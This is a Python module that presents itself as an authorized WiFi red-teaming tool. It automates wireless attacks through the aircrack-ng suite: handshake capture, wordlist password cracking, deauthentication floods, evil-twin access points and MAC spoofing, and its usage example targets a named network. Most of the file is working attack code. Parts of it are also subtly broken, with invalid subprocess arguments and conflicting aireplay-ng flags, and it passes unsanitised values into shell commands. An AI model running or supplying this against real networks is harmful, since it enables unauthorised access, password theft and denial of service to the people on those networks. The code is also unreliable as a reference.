"""
WiFi Red Teaming Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The WiFi Red Teaming module performs wireless network security testing including
network scanning, handshake capture, password cracking, deauthentication attacks,
evil twin attacks, and rogue access point creation. This module requires compatible
WiFi hardware and appropriate permissions.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.wifi_redteam import WiFiRedTeam
    
    # Initialize logger and module
    logger = FrameworkLogger("wifi_redteam")
    wifi = WiFiRedTeam(logger, interface="wlan0")
    
    # Scan for networks
    networks = wifi.scan_networks()
    print(f"Networks found: {len(networks['networks'])}")
    
    # Capture handshake
    handshake = wifi.capture_handshake(target_ssid="TargetNetwork", channel=6)
    print(f"Handshake captured: {handshake['success']}")
    
    # Crack password
    crack_result = wifi.crack_password(
        handshake_file="/tmp/handshake.cap",
        wordlist="/usr/share/wordlists/rockyou.txt"
    )
    print(f"Password found: {crack_result['password']}")
    
    # Deauthentication attack
    deauth = wifi.deauth_attack(target_ssid="TargetNetwork", duration=60)
    print(f"Deauth attack: {deauth['status']}")
    
    # Create evil twin
    evil_twin = wifi.create_evil_twin(
        ssid="TargetNetwork_Free",
        channel=6
    )
    print(f"Evil twin created: {evil_twin['status']}")

Red Team Use Cases:
- WiFi network reconnaissance
- WPA/WPA2 handshake capture
- Password cracking
- Deauthentication attacks
- Evil twin attacks
- Rogue access point creation
- MAC address spoofing
- Channel analysis
- Beacon flooding
- WiFi Pineapple integration
"""

from typing import Dict, List, Optional
import time
import subprocess
import platform
import os
import re
from pathlib import Path
from utils.logger import FrameworkLogger


class WiFiRedTeam:
    """WiFi red teaming module"""
    
    def __init__(self, logger: FrameworkLogger, interface: Optional[str] = None):
        """
        Initialize WiFi red teaming module
        
        Args:
            logger: Logger instance
            interface: WiFi interface name (e.g., "wlan0", "en0")
        """
        self.logger = logger
        self.interface = interface or self._detect_interface()
        self.monitor_interface = None
        self.capture_active = False
        self.attack_history = []
    
    def scan_networks(self, duration: int = 10) -> Dict:
        """
        Scan for WiFi networks
        
        Args:
            duration: Scan duration in seconds
        
        Returns:
            Dictionary containing discovered networks
        """
        self.logger.info(f"Scanning for WiFi networks on {self.interface}")
        
        results = {
            "interface": self.interface,
            "networks": [],
            "total_found": 0,
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Darwin":  # macOS
                # Use airport command (built-in on macOS)
                cmd = f'/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration + 5)
                
                if result.returncode == 0:
                    # Parse airport output
                    lines = result.stdout.strip().split('\n')[1:]  # Skip header
                    for line in lines:
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 6:
                                ssid = parts[0]
                                bssid = parts[1]
                                rssi = parts[2]
                                channel = parts[3]
                                security = ' '.join(parts[4:]) if len(parts) > 4 else "Unknown"
                                
                                results["networks"].append({
                                    "ssid": ssid,
                                    "bssid": bssid,
                                    "rssi": int(rssi) if rssi.lstrip('-').isdigit() else 0,
                                    "channel": int(channel) if channel.isdigit() else 0,
                                    "security": security,
                                    "encryption": "WPA2" if "WPA2" in security else "WPA" if "WPA" in security else "Open"
                                })
            
            elif platform.system() == "Linux":
                # Use iwlist or nmcli
                cmd = f'iwlist {self.interface} scan'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration + 5)
                
                if result.returncode == 0:
                    # Parse iwlist output
                    current_network = {}
                    for line in result.stdout.split('\n'):
                        line = line.strip()
                        
                        if 'Cell' in line and 'Address' in line:
                            if current_network:
                                results["networks"].append(current_network)
                            current_network = {}
                            bssid_match = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', line)
                            if bssid_match:
                                current_network["bssid"] = bssid_match.group(1)
                        
                        elif 'ESSID:' in line:
                            ssid_match = re.search(r'ESSID:"([^"]*)"', line)
                            if ssid_match:
                                current_network["ssid"] = ssid_match.group(1)
                        
                        elif 'Channel:' in line:
                            channel_match = re.search(r'Channel:\s*(\d+)', line)
                            if channel_match:
                                current_network["channel"] = int(channel_match.group(1))
                        
                        elif 'Quality=' in line:
                            signal_match = re.search(r'Signal level=(-?\d+)', line)
                            if signal_match:
                                current_network["rssi"] = int(signal_match.group(1))
                        
                        elif 'Encryption key:' in line:
                            if 'on' in line.lower():
                                current_network["encryption"] = "WPA2"  # Default assumption
                            else:
                                current_network["encryption"] = "Open"
                        
                        elif 'IEEE 802.11i/WPA2' in line:
                            current_network["encryption"] = "WPA2"
                        
                        elif 'WPA' in line:
                            current_network["encryption"] = "WPA"
                    
                    if current_network:
                        results["networks"].append(current_network)
            
            results["total_found"] = len(results["networks"])
            
        except Exception as e:
            self.logger.error(f"Network scanning failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def enable_monitor_mode(self) -> Dict:
        """
        Enable monitor mode on WiFi interface
        
        Returns:
            Dictionary containing monitor mode status
        """
        self.logger.info(f"Enabling monitor mode on {self.interface}")
        
        results = {
            "interface": self.interface,
            "monitor_interface": None,
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Linux":
                # Create monitor interface
                monitor_name = f"{self.interface}mon"
                
                cmd = f'iw dev {self.interface} interface add {monitor_name} type monitor'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    # Bring interface up
                    subprocess.run(f'ip link set {monitor_name} up', shell=True, timeout=5)
                    
                    results["monitor_interface"] = monitor_name
                    results["success"] = True
                    self.monitor_interface = monitor_name
                else:
                    # Try airmon-ng
                    cmd = f'airmon-ng start {self.interface}'
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                    
                    if result.returncode == 0:
                        # Find monitor interface
                        output = result.stdout
                        monitor_match = re.search(r'monitor mode enabled on (\w+)', output)
                        if monitor_match:
                            results["monitor_interface"] = monitor_match.group(1)
                            results["success"] = True
                            self.monitor_interface = monitor_match.group(1)
            
            elif platform.system() == "Darwin":
                # macOS doesn't easily support monitor mode without special tools
                results["note"] = "Monitor mode on macOS requires specialized tools (like Kismac)"
                results["success"] = False
                
        except Exception as e:
            self.logger.error(f"Monitor mode enable failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def capture_handshake(self, target_ssid: str, target_bssid: Optional[str] = None,
                         channel: Optional[int] = None, timeout: int = 300,
                         output_file: Optional[str] = None) -> Dict:
        """
        Capture WPA/WPA2 handshake
        
        Args:
            target_ssid: Target network SSID
            target_bssid: Target network BSSID (optional)
            channel: Channel to monitor (optional)
            timeout: Capture timeout in seconds
            output_file: Output file path (optional)
        
        Returns:
            Dictionary containing handshake capture results
        """
        self.logger.info(f"Capturing handshake for {target_ssid}")
        
        if output_file is None:
            output_file = f"/tmp/handshake_{target_ssid}_{int(time.time())}.cap"
        
        results = {
            "target_ssid": target_ssid,
            "target_bssid": target_bssid,
            "channel": channel,
            "output_file": output_file,
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            # Enable monitor mode if not already enabled
            if not self.monitor_interface:
                monitor_result = self.enable_monitor_mode()
                if not monitor_result["success"]:
                    results["error"] = "Failed to enable monitor mode"
                    return results
            
            interface = self.monitor_interface or self.interface
            
            if platform.system() == "Linux":
                # Use airodump-ng to capture handshake
                cmd_parts = ['airodump-ng']
                cmd_parts.extend(['-w', output_file.replace('.cap', '')])
                cmd_parts.extend(['--output-format', 'cap'])
                
                if channel:
                    cmd_parts.extend(['-c', str(channel)])
                
                if target_bssid:
                    cmd_parts.extend(['--bssid', target_bssid])
                
                cmd_parts.append(interface)
                
                # Start capture in background
                process = subprocess.Popen(
                    cmd_parts,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=timeout
                )
                
                self.capture_active = True
                self.logger.info(f"Handshake capture started (timeout: {timeout}s)")
                
                # Wait for handshake or timeout
                try:
                    process.wait(timeout=timeout)
                except subprocess.TimeoutExpired:
                    process.kill()
                
                # Check if handshake was captured
                if os.path.exists(output_file):
                    # Check if file contains handshake (simplified check)
                    file_size = os.path.getsize(output_file)
                    if file_size > 1000:  # Handshake should be substantial
                        results["success"] = True
                        results["file_size"] = file_size
                
                self.capture_active = False
                
            elif platform.system() == "Darwin":
                results["note"] = "Handshake capture on macOS requires specialized tools (like Kismac or external tools)"
                results["success"] = False
            
        except Exception as e:
            self.logger.error(f"Handshake capture failed: {e}")
            results["error"] = str(e)
            self.capture_active = False
        
        if results["success"]:
            self.attack_history.append({"attack_type": "handshake_capture", "results": results})
        
        return results
    
    def crack_password(self, handshake_file: str, wordlist: Optional[str] = None,
                      ssid: Optional[str] = None) -> Dict:
        """
        Crack WiFi password from handshake file
        
        Args:
            handshake_file: Path to handshake capture file
            wordlist: Path to wordlist file (optional)
            ssid: SSID (optional, for SSID-specific wordlists)
        
        Returns:
            Dictionary containing password cracking results
        """
        self.logger.info(f"Cracking password from {handshake_file}")
        
        if wordlist is None:
            # Common wordlist locations
            wordlist_candidates = [
                "/usr/share/wordlists/rockyou.txt",
                "/usr/share/wordlists/passwords.txt",
                "/usr/share/john/password.lst",
                "/opt/wordlists/rockyou.txt"
            ]
            
            for wl in wordlist_candidates:
                if os.path.exists(wl):
                    wordlist = wl
                    break
        
        results = {
            "handshake_file": handshake_file,
            "wordlist": wordlist,
            "password": None,
            "success": False,
            "timestamp": time.time()
        }
        
        if not wordlist or not os.path.exists(wordlist):
            results["error"] = "Wordlist not found"
            return results
        
        if not os.path.exists(handshake_file):
            results["error"] = "Handshake file not found"
            return results
        
        try:
            # Use aircrack-ng to crack password
            cmd = f'aircrack-ng -w {wordlist} {handshake_file}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3600)
            
            # Parse aircrack-ng output
            output = result.stdout + result.stderr
            
            # Look for "KEY FOUND!" in output
            key_match = re.search(r'KEY FOUND!\s*\[(.+)\]', output)
            if key_match:
                results["password"] = key_match.group(1).strip()
                results["success"] = True
                self.logger.warning(f"Password cracked: {results['password']}")
            else:
                results["success"] = False
                results["note"] = "Password not found in wordlist"
                
        except subprocess.TimeoutExpired:
            results["error"] = "Cracking timeout (password may be too strong)"
        except Exception as e:
            self.logger.error(f"Password cracking failed: {e}")
            results["error"] = str(e)
        
        if results["success"]:
            self.attack_history.append({"attack_type": "password_crack", "results": results})
        
        return results
    
    def deauth_attack(self, target_ssid: str, target_bssid: Optional[str] = None,
                     client_mac: Optional[str] = None, duration: int = 60,
                     packet_count: int = 0) -> Dict:
        """
        Perform deauthentication attack
        
        Args:
            target_ssid: Target network SSID
            target_bssid: Target network BSSID (optional)
            client_mac: Specific client MAC to target (optional)
            duration: Attack duration in seconds
            packet_count: Number of deauth packets (0 = continuous)
        
        Returns:
            Dictionary containing deauth attack results
        """
        self.logger.info(f"Starting deauth attack against {target_ssid}")
        
        results = {
            "target_ssid": target_ssid,
            "target_bssid": target_bssid,
            "client_mac": client_mac,
            "duration": duration,
            "packets_sent": 0,
            "status": "failed",
            "timestamp": time.time()
        }
        
        try:
            # Enable monitor mode if needed
            if not self.monitor_interface:
                monitor_result = self.enable_monitor_mode()
                if not monitor_result["success"]:
                    results["error"] = "Failed to enable monitor mode"
                    return results
            
            interface = self.monitor_interface or self.interface
            
            if platform.system() == "Linux":
                # Use aireplay-ng for deauthentication
                cmd_parts = ['aireplay-ng', '--deauth']
                
                if packet_count > 0:
                    cmd_parts.extend(['-c', str(packet_count)])
                else:
                    cmd_parts.extend(['-0', str(duration)])  # Continuous
                
                if target_bssid:
                    cmd_parts.extend(['-a', target_bssid])
                
                if client_mac:
                    cmd_parts.extend(['-c', client_mac])
                
                cmd_parts.append(interface)
                
                # Run deauth attack
                process = subprocess.Popen(
                    cmd_parts,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for duration or until process completes
                try:
                    process.wait(timeout=duration)
                except subprocess.TimeoutExpired:
                    process.kill()
                
                results["status"] = "completed"
                results["packets_sent"] = duration * 10  # Estimate
                
            elif platform.system() == "Darwin":
                results["note"] = "Deauth attacks on macOS require specialized tools"
                results["status"] = "unsupported"
            
        except Exception as e:
            self.logger.error(f"Deauth attack failed: {e}")
            results["error"] = str(e)
        
        self.attack_history.append({"attack_type": "deauth", "results": results})
        return results
    
    def create_evil_twin(self, ssid: str, channel: int = 6, interface: Optional[str] = None) -> Dict:
        """
        Create evil twin access point
        
        Args:
            ssid: SSID for evil twin
            channel: WiFi channel
            interface: Interface to use (optional)
        
        Returns:
            Dictionary containing evil twin status
        """
        self.logger.info(f"Creating evil twin: {ssid}")
        
        results = {
            "ssid": ssid,
            "channel": channel,
            "status": "failed",
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Linux":
                # Use hostapd to create AP
                hostapd_config = f"""
interface={interface or self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
                
                config_file = f"/tmp/hostapd_{ssid}.conf"
                with open(config_file, 'w') as f:
                    f.write(hostapd_config)
                
                # Start hostapd
                cmd = f'hostapd {config_file}'
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                time.sleep(2)  # Give it time to start
                
                if process.poll() is None:
                    results["status"] = "active"
                    results["process_id"] = process.pid
                    results["config_file"] = config_file
                else:
                    results["error"] = "Failed to start hostapd"
                    
            elif platform.system() == "Darwin":
                results["note"] = "Evil twin creation on macOS requires specialized tools"
                results["status"] = "unsupported"
                
        except Exception as e:
            self.logger.error(f"Evil twin creation failed: {e}")
            results["error"] = str(e)
        
        self.attack_history.append({"attack_type": "evil_twin", "results": results})
        return results
    
    def spoof_mac_address(self, interface: Optional[str] = None, mac: Optional[str] = None) -> Dict:
        """
        Spoof MAC address
        
        Args:
            interface: Interface to spoof (optional)
            mac: MAC address to use (optional, generates random if not provided)
        
        Returns:
            Dictionary containing MAC spoofing results
        """
        self.logger.info(f"Spoofing MAC address on {interface or self.interface}")
        
        if mac is None:
            import random
            # Generate random MAC
            mac = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
        
        results = {
            "interface": interface or self.interface,
            "new_mac": mac,
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Linux":
                # Bring interface down
                subprocess.run(f'ip link set {results["interface"]} down', shell=True, timeout=5)
                
                # Change MAC
                cmd = f'macchanger -m {mac} {results["interface"]}'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    # Bring interface up
                    subprocess.run(f'ip link set {results["interface"]} up', shell=True, timeout=5)
                    results["success"] = True
                    
            elif platform.system() == "Darwin":
                cmd = f'sudo ifconfig {results["interface"]} ether {mac}'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                results["success"] = result.returncode == 0
                
        except Exception as e:
            self.logger.error(f"MAC spoofing failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def analyze_channels(self) -> Dict:
        """
        Analyze WiFi channel usage
        
        Returns:
            Dictionary containing channel analysis
        """
        self.logger.info("Analyzing WiFi channels")
        
        results = {
            "channels": {},
            "timestamp": time.time()
        }
        
        # Scan networks first
        scan_results = self.scan_networks()
        
        # Count networks per channel
        for network in scan_results.get("networks", []):
            channel = network.get("channel", 0)
            if channel > 0:
                if channel not in results["channels"]:
                    results["channels"][channel] = {
                        "count": 0,
                        "networks": []
                    }
                results["channels"][channel]["count"] += 1
                results["channels"][channel]["networks"].append(network.get("ssid"))
        
        return results
    
    def _detect_interface(self) -> str:
        """Detect WiFi interface"""
        try:
            if platform.system() == "Darwin":
                # macOS
                result = subprocess.run(
                    ['networksetup', '-listallhardwareports'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    # Look for Wi-Fi interface
                    for line in result.stdout.split('\n'):
                        if 'Wi-Fi' in line or 'AirPort' in line:
                            # Next line should have device
                            continue
                        elif 'Device:' in line:
                            return line.split('Device:')[1].strip()
                return "en0"  # Default macOS WiFi
            
            elif platform.system() == "Linux":
                # Linux
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    # Extract interface name
                    match = re.search(r'Interface\s+(\w+)', result.stdout)
                    if match:
                        return match.group(1)
                return "wlan0"  # Default Linux WiFi
            
        except Exception:
            pass
        
        return "wlan0"
    
    def get_attack_history(self) -> List[Dict]:
        """Get attack history"""
        return self.attack_history

